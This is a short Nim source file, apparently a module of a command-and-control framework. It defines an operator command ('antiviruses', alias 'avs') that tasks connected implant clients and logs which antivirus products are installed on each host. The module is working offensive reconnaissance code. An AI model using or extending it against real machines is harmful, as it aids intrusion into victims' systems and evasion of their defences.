import ../prelude

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.cli.handlingClient:
    let task = await client.sendClientTask("antiviruses")
    if not task.isNil(): 
      await task.awaitResponse()
      if not task.isError():
        infoLog "AVs installed on " & $client & ":" 
        let p = initParser()
        p.setBuffer(cast[seq[byte]](task.output.data))

        let AVsCount = p.extractInt32()

        for _ in 1..AVsCount:
          try: infoLog p.extractString(), false
          except IndexDefect: discard 

let cmd*: Command = Command(
  execProc: execProc,
  name: "antiviruses",
  argsLength: 0,
  usage: @["antiviruses"],
  aliases: @["avs"],
  cliMode: @[ClientInteractMode],
  description: "Enumerate the installed AVs on the system",
  category: CCClientInteraction,
  requiresConnectedClient: true
)